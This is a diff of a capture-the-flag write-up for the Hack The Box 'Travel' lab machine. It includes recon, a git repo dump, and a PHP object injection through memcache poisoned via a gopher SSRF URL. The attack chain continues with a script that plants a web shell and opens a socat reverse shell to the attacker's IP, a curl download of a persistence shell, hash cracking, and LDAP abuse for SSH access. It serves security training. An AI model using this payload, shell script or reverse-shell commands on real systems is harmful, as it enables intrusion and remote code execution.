@@ -3,8 +3,18 @@
 ## nmap
 
 ```
+╭─zoey@parrot-virtual ~/sec
+╰─$ nmap -A -p- 10.10.10.189
+Starting Nmap 7.91 ( https://nmap.org ) at 2021-01-31 01:23 GMT
+Nmap scan report for 10.10.10.189
+Host is up (0.073s latency).
+Not shown: 65532 closed ports
 PORT    STATE SERVICE  VERSION
 22/tcp  open  ssh      OpenSSH 8.2p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   3072 d3:9f:31:95:7e:5e:11:45:a2:b4:b6:34:c0:2d:2d:bc (RSA)
+|   256 ef:3f:44:21:46:8d:eb:6c:39:9c:78:4f:50:b3:f3:6b (ECDSA)
+|_  256 3a:01:bc:f8:57:f5:27:a1:68:1d:6a:3d:4e:bc:21:1b (ED25519)
 80/tcp  open  http     nginx 1.17.6
 |_http-server-header: nginx/1.17.6
 |_http-title: Travel.HTB
@@ -16,9 +26,13 @@ PORT    STATE SERVICE  VERSION
 | Not valid before: 2020-04-23T19:24:29
 |_Not valid after:  2030-04-21T19:24:29
 Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 64.78 seconds
+
 ```
 
-This gives use three hostnames to work with.
+This gives use three hostnames to work with on the web server.
 
 ## https
 
@@ -57,7 +71,7 @@ So let's move on to it.
 `/` is forbidden. Let's run some enum:
 
 ```shell-session
-╭─zoey@nomadic ~/htb ‹master*›
+╭─zoey@virtual-parrot ~/sec/htb ‹master›
 ╰─$ gobuster dir -w /usr/share/wordlists/dirb/common.txt -u http://blog-dev.travel.htb
 ===============================================================
 Gobuster v3.0.1
@@ -78,7 +92,7 @@ by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
 Looks like there's a git repository. Let's see what we can grab with the dumper from https://github.com/internetwache/GitTools:
 
 ```shell-session
-╭─zoey@nomadic ~/htb/travel ‹master*›
+╭─zoey@virtual-parrot ~/sec/htb/travel ‹master›
 ╰─$ ../tools/GitTools/Dumper/gitdumper.sh http://blog-dev.travel.htb/.git/ blog-dev-git
 ###########
 # GitDumper is part of https://github.com/internetwache/GitTools
@@ -120,7 +134,7 @@ Looks like there's a git repository. Let's see what we can grab with the dumper 
 Let's take a look in our new folder and see what we dumped.
 
 ```shell-session
-╭─zoey@nomadic ~/htb/travel/blog-dev-git ‹master*›
+╭─zoey@virtual-parrot ~/sec/htb/travel/blog-dev-git ‹master›
 ╰─$ ls -la
 total 12
 drwxr-xr-x 3 zoey zoey 4096 May 26 12:31 .
@@ -131,7 +145,7 @@ drwxr-xr-x 6 zoey zoey 4096 May 26 12:31 .git
 Hmmm, not much. Let's take a look at the log:
 
 ```shell-session
-╭─zoey@nomadic ~/htb/travel/blog-dev-git ‹master*›
+╭─zoey@virtual-parrot ~/sec/htb/travel/blog-dev-git ‹master›
 ╰─$ git log --stat
 commit 0313850ae948d71767aff2cc8cc0f87a0feeef63 (HEAD -> master)
 Author: jane <jane@travel.htb>
@@ -148,7 +162,7 @@ Date:   Tue Apr 21 01:34:54 2020 -0700
 So we should have three files. They weren't pulled though, so we'll need to recreate them from the history. We can do this by restoring the 'deleted' files:
 
 ```shell-session
-╭─zoey@nomadic ~/htb/travel/blog-dev-git ‹master*›
+╭─zoey@virtual-parrot ~/sec/htb/travel/blog-dev-git ‹master›
 ╰─$ git status
 On branch master
 Changes not staged for commit:
@@ -159,9 +173,9 @@ Changes not staged for commit:
         deleted:    template.php
 
 no changes added to commit (use "git add" and/or "git commit -a")
-╭─zoey@nomadic ~/htb/travel/blog-dev-git ‹master*›
+╭─zoey@virtual-parrot ~/sec/htb/travel/blog-dev-git ‹master›
 ╰─$ git restore .
-╭─zoey@nomadic ~/htb/travel/blog-dev-git ‹master›
+╭─zoey@virtual-parrot ~/sec/htb/travel/blog-dev-git ‹master›
 ╰─$ ls -la
 total 24
 drwxr-xr-x 3 zoey zoey 4096 May 26 12:43 .
@@ -287,7 +301,7 @@ It seems plausible that a cache might serialize and unserialize its values, so l
 
 ## SimplePie
 
-If we search the wordpress git repo for 'unserialize' we find a `Memcache.php` that's part of SimplePie with the following functions:
+If we [search the wordpress git repo for 'unserialize'](https://github.com/WordPress/WordPress/search?q=unserialize) we find a [Memcache.php](https://github.com/WordPress/WordPress/blob/b3b8942dfcb451eddb5559b63c1043fce5d9449e/wp-includes/SimplePie/Cache/Memcache.php) that's part of SimplePie with the following functions:
 
 ```php
 	public function save($data)
@@ -351,10 +365,10 @@ call to set the cache value. In the constructor in the same file we find:
 It looks like there are a few things that are still unknown. We could just setup our own instance that reproduces the setup on the box and throw in some
 logging statements to spit out the key, which is what I did, and allows for testing our payload later. However, we can also just grok the code.
 The prefix, which comes from the `$location`, is what we saw in `rss_template.php`, which is `_xct`. The `TYPE_FEED` we can search for in the source, and
-we find in `SimplePie/Cache/Base.php`:
+we find it in `SimplePie/Cache/Base.php`:
 
 ```php
-/**
+  /**
 	 * Feed cache type
 	 *
 	 * @var string
@@ -365,28 +379,27 @@ we find in `SimplePie/Cache/Base.php`:
 If we look at the `init` function in `class-simplepi.php` we find the call to get the cache and see the name that's passed is the url:
 
 ```php
-if ($this->feed_url !== null)
-		{
-			$parsed_feed_url = $this->registry->call('Misc', 'parse_url', array($this->feed_url));
+  if ($this->feed_url !== null) {
+    $parsed_feed_url = $this->registry->call('Misc', 'parse_url', array($this->feed_url));
 
-			// Decide whether to enable caching
-			if ($this->cache && $parsed_feed_url['scheme'] !== '')
-			{
-				$url = $this->feed_url . ($this->force_feed ? '#force_feed' : '');
-				$cache = $this->registry->call('Cache', 'get_handler', array($this->cache_location, call_user_func($this->cache_name_function, $url), 'spc'));
-			}
-
-			// Fetch the data via SimplePie_File into $this->raw_data
-			if (($fetched = $this->fetch_data($cache)) === true)
-			{
-				return true;
-			}
-			elseif ($fetched === false) {
-				return false;
-			}
-
-			list($headers, $sniffed) = $fetched;
+    // Decide whether to enable caching
+    if ($this->cache && $parsed_feed_url['scheme'] !== '')
+    {
+      $url = $this->feed_url . ($this->force_feed ? '#force_feed' : '');
+      $cache = $this->registry->call('Cache', 'get_handler', array($this->cache_location, call_user_func($this->cache_name_function, $url), 'spc'));
     }
+
+    // Fetch the data via SimplePie_File into $this->raw_data
+    if (($fetched = $this->fetch_data($cache)) === true)
+    {
+      return true;
+    }
+    elseif ($fetched === false) {
+      return false;
+    }
+
+    list($headers, $sniffed) = $fetched;
+  }
 ```
 
 So we'll need to find out what the `cache_name_function` is. Searching within the same file we find:
@@ -408,7 +421,7 @@ echo 'xct_' . md5(md5('http://10.10.14.39/feed.html') . ':spc');
 
 ## Object Injection Payload
 
-We need to setup a serialized php object that's an instance of TemplateHelper, so that when the `__wakeup` method is run, we write
+We need to setup a serialized php object that's an instance of `TemplateHelper`, so that when the `__wakeup` method is run, we write
 a web shell to the logs directory. We can generate and test our payload with the following:
 
 ```php
@@ -509,57 +522,66 @@ FINALLY, we have something to generate a working payload.
 
 ## Scripting The Reverse Shell
 
-Let's make a call to the php script we just made for the payload and then use it to make the calls and connect a reverse shell:
+Let's make a call to the php script we just made for the payload and then use it to make the calls and connect a reverse shell. Be sure blog.travel.htb
+resolves to the box's address. I used a different payload the first time trying this as socat is not usually available, but it is, so lets use it
+on our scripted way back into the box.
 
 ```sh
 #!/bin/sh
+
+GREEN="\e[0;32m"
+CLEAR="\e[m"
 
 # Get our IP on HTB
 htbip=$(ifconfig | grep "destination 10.10" | sed 's/.*destination //')
 echo "htb ip ${htbip}"
 
+# Doesn't really matter what this, as long as its consistent, but if you've got your own
+# server running you can verify it's being hit
 feed_url="http://${htbip}/feed.html"
+
+# Use our php script to generate the injection payload
 payload_url=$(php gen-payload-only.php ${feed_url})
-echo "setting memcached value via gopher ${payload_url}"
+
+echo "${GREEN}- setting memcached value via gopher${CLEAR} ${payload_url}"
 curl --silent "http://blog.travel.htb/awesome-rss/?custom_feed_url=${payload_url}" > /dev/null
-echo "sending request for for feed url to initiate object injection..."
+
+echo "${GREEN}- sending request for for feed url to initiate object injection..."
 curl --silent "http://blog.travel.htb/awesome-rss/?custom_feed_url=${feed_url}" > /dev/null
-echo "using created file to initiate reverse shell..."
+
+echo "- using created file to initiate reverse shell...${CLEAR}"
 curl --silent "http://blog.travel.htb/wp-content/themes/twentytwenty/logs/rs.php?1=socat%20exec%3A%27bash%20%2Dli%27%2Cpty%2Cstderr%2Csetsid%2Csigint%2Csane%20tcp%3A${htbip}%3A22473" & > /dev/null
+
+# catch reverse shell
 socat file:`tty`,raw,echo=0 tcp-listen:22473
 ```
 
 And let's give it a try:
 
 ```shell-session
-╭─zoey@nomadic ~/htb/travel ‹master*›
-╰─$ ./reverse-shell.sh http://10.10.14.39/feed.html 22473 &; nc -lvp 22473
-[1] 146681
-listening on [any] 22473 ...
-htb ip 10.10.14.39
-connect to [10.10.14.39] from travel.htb [10.10.10.189] 53016
-whoami
+╭─zoey@parrot-virtual ~/sec/htb/travel ‹master› 
+╰─$ ./reverse-shell.sh
+htb ip 10.10.14.12
+- setting memcached value via gopher gopher://LOCALHOST:11211/_%0d%0aset%20xct_d159dbbff1582b62237476cec033a443%204%200%20129%0d%0aO%3A14%3A%22TemplateHelper%22%3A2%3A%7Bs%3A20%3A%22%00TemplateHelper%00file%22%3Bs%3A6%3A%22rs.php%22%3Bs%3A20%3A%22%00TemplateHelper%00data%22%3Bs%3A26%3A%22%3C%3Fphp%20system%28%24_GET%5B1%5D%29%3B%20%3F%3E%22%3B%7D%0d%0a
+- sending request for for feed url to initiate object injection...
+- using created file to initiate reverse shell...
+www-data@blog:/var/www/html/wp-content/themes/twentytwenty/logs$ ls
+rs.php
+www-data@blog:/var/www/html/wp-content/themes/twentytwenty/logs$ whoami
 www-data
-uname -a
-Linux blog 5.4.0-26-generic #30-Ubuntu SMP Mon Apr 20 16:58:30 UTC 2020 x86_64 GNU/Linux
-pwd
-/var/www/html/wp-content/themes/twentytwenty/logs
 ```
 
 ## Persistence
 
-We eventually learn there's likely a script running to remove the files in the `/logs` directory. Let
-setup some persistence by putting a webshell in a different directory. Just use curl to download a shell
+We eventually learn there's likely a script running to remove the files in the `/logs` directory and it kills our web shell. Let
+setup some persistence by putting a web shell in a different directory. Just use curl to download a shell
 from your local server: `curl http://10.10.14.39/tools/bash.php -o ../bash.php`. Then we can access it at
 `http://blog.travel.htb/wp-content/themes/twentytwenty/bash.php`.
 
-## Fully Interactive TTY
-
-It doesn't seem we have access to python, so let's use socat. Let's download it to the machine and use it
-to setup a reverse shell. On kali:
+Then we can setup a reverse shell. On kali:
 
 ```shell-session
-╭─zoey@nomadic ~/htb/travel ‹master*›
+╭─zoey@virtual-parrot ~/sec/htb/travel ‹master›
 ╰─$ socat file:`tty`,raw,echo=0 tcp-listen:22473
 www-data@blog:/var/www/html/wp-content/themes/twentytwenty$
 ```
@@ -572,12 +594,26 @@ www-data@blog:/var/www/html/wp-content/themes/twentytwenty# socat exec:'bash -li
 
 ## www-data enum and owning user
 
-So after enuming all the things looking for vulnerabilities and potential credentials, and trying to crack all the credentials you've found thus far,
-check in `/opt/wordpress` and find an sql file that's a backup. Ask yourself why someone would put it there, and then crack the hash in it:
+So after enuming all the things, looking for vulnerabilities and potential credentials, and trying to crack all the credentials you've found thus far,
+check in `/opt/wordpress` and find a `backup-13-04-2020.sql`. Ask yourself why someone would put it there, then investigate it to find a dump of the
+wordpress users table near the bottom of the file.
+
+```sql
+--
+-- Dumping data for table `wp_users`
+--
+
+LOCK TABLES `wp_users` WRITE;
+/*!40000 ALTER TABLE `wp_users` DISABLE KEYS */;
+INSERT INTO `wp_users` VALUES (1,'admin','$P$BIRXVj/ZG0YRiBH8gnRy0chBx67WuK/','admin','admin@travel.htb','http://localhost','2020-04-13 13:19:01','',0,'admin'),(2,'lynik-admin','$P$B/wzJzd3pj/n7oTe2GGpi5HcIl4ppc.','lynik-admin','lynik@travel.htb','','2020-04-13 13:36:18','',0,'Lynik Schmidt');
+/*!40000 ALTER TABLE `wp_users` ENABLE KEYS */;
+UNLOCK TABLES;
+/*!40103 SET TIME_ZONE=@OLD_TIME_ZONE */;
+```
 
 ```shell-session
-╭─zoey@nomadic ~/htb/tools ‹master*›
-╰─$ hashcat -a 0 -m 400 ../travel/lynik-admin.hash /usr/share/wordlists/rockyou.txt
+╭─zoey@virtual-parrot ~/sec/htb/travel ‹master›
+╰─$ hashcat -a 0 -m 400 lynik-admin.hash /usr/share/wordlists/rockyou.txt
 hashcat (v5.1.0) starting...
 
 * Device #2: Not a native Intel OpenCL runtime. Expect massive speed loss.
@@ -660,12 +696,12 @@ trvl-admin:x:1000:1000:trvl-admin:/home/trvl-admin:/bin/bash
 
 ### nmap on ldap.travel.htb
 
-Setup the SSH proxy and run nmap against the ldap server:
+Setup a socks proxy via ssh and run `nmap` against the ldap server:
 
 ```shell-session
-╭─zoey@nomadic ~
+╭─zoey@virtual-parrot ~
 ╰─$ ssh -D localhost:9050 -f -N lynik-admin@travel.htb
-╭─zoey@nomadic ~
+╭─zoey@virtual-parrot ~
 ╰─$ proxychains nmap -T4 -A -p 389,636 172.20.0.10
 [proxychains] config file found: /etc/proxychains.conf
 [proxychains] preloading /usr/lib/libproxychains4.so
@@ -784,12 +820,12 @@ result: 0 Success
 
 ### JXplorer and ProxyChains
 
-Not knowing much about ldap I setup proxy chains with JXplorer. It allowed me to easily explore the hierarchy and test what values I could change/add/etc...
+Not knowing much about ldap I setup proxy chains with [JXplorer](http://jxplorer.org/). It allowed me to easily explore the hierarchy and test what values I could change/add/etc...
 
 ```
-╭─zoey@nomadic ~
+╭─zoey@virtual-parrot ~
 ╰─$ ssh -D localhost:9050 -f -N lynik-admin@travel.htb
-╭─zoey@nomadic ~
+╭─zoey@virtual-parrot ~
 ╰─$ proxychains /bin/java -Dfile.encoding=utf-8 -Xms2048m -cp ".:jars/*:jasper/lib/*" com.ca.directory.jxplorer.JXplorer
 ```
 
@@ -798,7 +834,7 @@ add the `ldapPublicKey` `objectClass`, before you can add the `sshPublicKey` obj
 
 ## Owning trvl-admin
 
-Note: You can skip this step if you like, it's unnecessary, but was part of the learning process for me. Let's create a script to make the necessary changes:
+Note: You can skip this step if you like, it's unnecessary, but was part of the learning process for me. Let's create a script to make the necessary changes so we can ssh in:
 
 ```sh
 #!/bin/sh
@@ -874,7 +910,7 @@ result: 0 Success
 Let's try to SSH in as jane now:
 
 ```shell-session
-╭─zoey@nomadic ~/htb/travel ‹master*›
+╭─zoey@virtual-parrot ~/sec/htb/travel ‹master›
 ╰─$ ssh jane@travel.htb
 Welcome to Ubuntu 20.04 LTS (GNU/Linux 5.4.0-26-generic x86_64)
 
@@ -936,7 +972,7 @@ sshPublicKey: ${ssh_public_key}" | ldapmodify -D cn=lynik-admin,dc=travel,dc=htb
 And now let's SSH in as `jane`.
 
 ```shell-session
-╭─zoey@nomadic ~
+╭─zoey@virtual-parrot ~
 ╰─$ ssh jane@travel.htb
 Welcome to Ubuntu 20.04 LTS (GNU/Linux 5.4.0-26-generic x86_64)
 
